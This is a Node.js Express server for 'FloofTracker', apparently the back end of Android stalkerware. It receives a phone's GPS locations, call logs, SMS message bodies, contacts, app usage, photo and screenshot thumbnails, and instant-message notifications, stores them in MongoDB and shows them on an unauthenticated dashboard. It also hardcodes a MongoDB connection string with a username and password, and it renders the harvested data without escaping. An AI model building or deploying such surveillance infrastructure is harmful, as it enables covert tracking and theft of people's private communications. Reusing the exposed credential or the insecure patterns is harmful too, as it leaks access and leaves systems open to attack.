const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://paulcarbonel2205_db_user:oXde3qFT3DaUBjg8@flooftracker.l7bt2kx.mongodb.net/?appName=flooftracker';

// Connect to MongoDB
mongoose.connect(MONGO_URI)
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error('MongoDB error:', err));

// Schemas
const DeviceSchema = new mongoose.Schema({
    token: String,
    device_model: String,
    android_version: String,
    last_seen: Date
});

const GpsSchema = new mongoose.Schema({
    token: String,
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    received_at: Date
});

const CallSchema = new mongoose.Schema({
    token: String,
    number: String,
    contact_name: String,
    call_type: String,
    duration_seconds: Number,
    called_at: Number
});

const SmsSchema = new mongoose.Schema({
    token: String,
    number: String,
    contact_name: String,
    message_body: String,
    sms_type: String,
    received_at: Number
});

const AppSchema = new mongoose.Schema({
    token: String,
    app_name: String,
    package_name: String,
    usage_seconds: Number,
    usage_date: String
});

const ContactSchema = new mongoose.Schema({
    token: String,
    name: String,
    number: String
});

const MediaSchema = new mongoose.Schema({
    token: String,
    filename: String,
    date_taken: Number,
    path: String,
    size_bytes: Number,
    is_screenshot: Boolean,
    thumbnail: String  // base64
});

const NotificationSchema = new mongoose.Schema({
    token: String,
    app: String,
    sender: String,
    message: String,
    received_at: Date
});

// Models
const Device = mongoose.model('Device', DeviceSchema);
const Gps = mongoose.model('Gps', GpsSchema);
const Call = mongoose.model('Call', CallSchema);
const Sms = mongoose.model('Sms', SmsSchema);
const App = mongoose.model('App', AppSchema);
const Contact = mongoose.model('Contact', ContactSchema);
const Media = mongoose.model('Media', MediaSchema);
const Notification = mongoose.model('Notification', NotificationSchema);

function getToken(req) {
    return req.headers['x-device-token'] || 'unknown';
}

// Routes
app.post('/device/register', async (req, res) => {
    const token = getToken(req);
    await Device.findOneAndUpdate(
        { token },
        { token, ...req.body, last_seen: new Date() },
        { upsert: true }
    );
    console.log(`Device registered: ${token}`);
    res.json({ success: true });
});

app.post('/device/gps', async (req, res) => {
    const token = getToken(req);
    await Gps.create({ token, ...req.body, received_at: new Date() });
    console.log(`GPS from ${token}`);
    res.json({ success: true });
});

app.post('/device/calls', async (req, res) => {
    const token = getToken(req);
    await Call.deleteMany({ token });
    const calls = req.body.map(c => ({ token, ...c }));
    await Call.insertMany(calls);
    console.log(`${calls.length} calls from ${token}`);
    res.json({ success: true });
});

app.post('/device/sms', async (req, res) => {
    const token = getToken(req);
    await Sms.deleteMany({ token });
    const messages = req.body.map(m => ({ token, ...m }));
    await Sms.insertMany(messages);
    console.log(`${messages.length} SMS from ${token}`);
    res.json({ success: true });
});

app.post('/device/apps', async (req, res) => {
    const token = getToken(req);
    await App.deleteMany({ token });
    const apps = req.body.map(a => ({ token, ...a }));
    await App.insertMany(apps);
    console.log(`${apps.length} apps from ${token}`);
    res.json({ success: true });
});

app.post('/device/contacts', async (req, res) => {
    const token = getToken(req);
    await Contact.deleteMany({ token });
    const contacts = req.body.map(c => ({ token, ...c }));
    await Contact.insertMany(contacts);
    console.log(`${contacts.length} contacts from ${token}`);
    res.json({ success: true });
});

app.post('/device/media', async (req, res) => {
    const token = getToken(req);
    await Media.deleteMany({ token });
    const media = req.body.map(m => ({ token, ...m }));
    await Media.insertMany(media);
    console.log(`${media.length} media from ${token}`);
    res.json({ success: true });
});

app.post('/device/notifications', async (req, res) => {
    const token = getToken(req);
    await Notification.create({ token, ...req.body, received_at: new Date() });
    console.log(`Notification from ${token}`);
    res.json({ success: true });
});

app.get('/', async (req, res) => {
    const devices = await Device.find();
    const gps = await Gps.find().sort({ received_at: -1 }).limit(100);
    const calls = await Call.find().sort({ called_at: -1 });
    const sms = await Sms.find().sort({ received_at: -1 });
    const apps = await App.find().sort({ usage_seconds: -1 });
    const contacts = await Contact.find();
    const media = await Media.find().sort({ date_taken: -1 });
    const notifications = await Notification.find().sort({ received_at: -1 }).limit(200);

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>FloofTracker Dashboard</title>
        <meta http-equiv="refresh" content="30">
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
            h1 { color: #333; }
            .device { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; margin-bottom: 20px; }
            th { background: #333; color: white; padding: 10px; text-align: left; }
            td { padding: 8px 10px; border-bottom: 1px solid #eee; }
            tr:hover { background: #f9f9f9; }
            h2 { color: #555; margin-top: 20px; }
            img.thumb { width: 80px; height: 80px; object-fit: cover; border-radius: 4px; }
        </style>
    </head>
    <body>
        <h1>FloofTracker Dashboard</h1>

        <h2>Devices</h2>
        ${devices.map(d => `
            <div class="device">
                <b>Token:</b> ${d.token}<br>
                <b>Model:</b> ${d.device_model}<br>
                <b>Android:</b> ${d.android_version}<br>
                <b>Last seen:</b> ${d.last_seen}
            </div>
        `).join('')}

        <h2>App Usage</h2>
        <table>
            <tr><th>Device</th><th>App</th><th>Usage</th><th>Date</th></tr>
            ${apps.map(a => `
                <tr>
                    <td>${a.token}</td>
                    <td>${a.app_name}</td>
                    <td>${Math.round(a.usage_seconds / 60)} min</td>
                    <td>${a.usage_date}</td>
                </tr>
            `).join('')}
        </table>

        <h2>Calls</h2>
        <table>
            <tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr>
            ${calls.map(c => `
                <tr>
                    <td>${c.token}</td>
                    <td>${c.number}</td>
                    <td>${c.contact_name}</td>
                    <td>${c.call_type}</td>
                    <td>${c.duration_seconds}s</td>
                    <td>${new Date(c.called_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>SMS</h2>
        <table>
            <tr><th>Device</th><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
            ${sms.map(s => `
                <tr>
                    <td>${s.token}</td>
                    <td>${s.number}</td>
                    <td>${s.sms_type}</td>
                    <td>${s.message_body}</td>
                    <td>${new Date(s.received_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>GPS</h2>
        <table>
            <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Map</th><th>Date</th></tr>
            ${gps.map(g => `
                <tr>
                    <td>${g.token}</td>
                    <td>${g.latitude}</td>
                    <td>${g.longitude}</td>
                    <td>${g.accuracy}m</td>
                    <td><a href="https://maps.google.com/?q=${g.latitude},${g.longitude}" target="_blank">View on Map</a></td>
                    <td>${new Date(g.received_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>Contacts</h2>
        <table>
            <tr><th>Device</th><th>Name</th><th>Number</th></tr>
            ${contacts.map(c => `
                <tr>
                    <td>${c.token}</td>
                    <td>${c.name}</td>
                    <td>${c.number}</td>
                </tr>
            `).join('')}
        </table>

        <h2>Media & Screenshots</h2>
        <table>
            <tr><th>Device</th><th>Preview</th><th>Filename</th><th>Type</th><th>Size</th><th>Date Taken</th></tr>
            ${media.map(m => `
                <tr>
                    <td>${m.token}</td>
                    <td>${m.thumbnail ? `<img class="thumb" src="data:image/jpeg;base64,${m.thumbnail}"/>` : 'No preview'}</td>
                    <td>${m.filename}</td>
                    <td>${m.is_screenshot ? '📸 Screenshot' : '🖼️ Photo'}</td>
                    <td>${Math.round(m.size_bytes / 1024)}KB</td>
                    <td>${new Date(m.date_taken).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>Instant Messages</h2>
        <table>
            <tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Date</th></tr>
            ${notifications.map(n => `
                <tr>
                    <td>${n.token}</td>
                    <td>${n.app}</td>
                    <td>${n.sender}</td>
                    <td>${n.message}</td>
                    <td>${new Date(n.received_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});